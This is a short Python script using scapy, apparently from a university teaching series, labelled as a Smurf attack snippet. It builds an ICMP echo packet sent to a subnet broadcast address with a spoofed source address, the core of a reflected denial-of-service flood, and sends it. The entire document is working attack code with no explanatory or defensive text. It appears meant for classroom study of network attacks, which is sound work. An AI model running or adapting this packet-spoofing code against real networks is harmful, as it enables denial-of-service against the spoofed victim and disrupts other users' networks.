# All-by-Pythonself
# Snippet for the Smurf attacks
# by Hae Young Lee
# at Cheongju University

from scapy . all import *
p = Ether (dst = "ff:ff:ff:ff:ff:ff") / IP (dst = "10.0.2.255", src = "10.0.2.1") / ICMP ()
sendp (p)
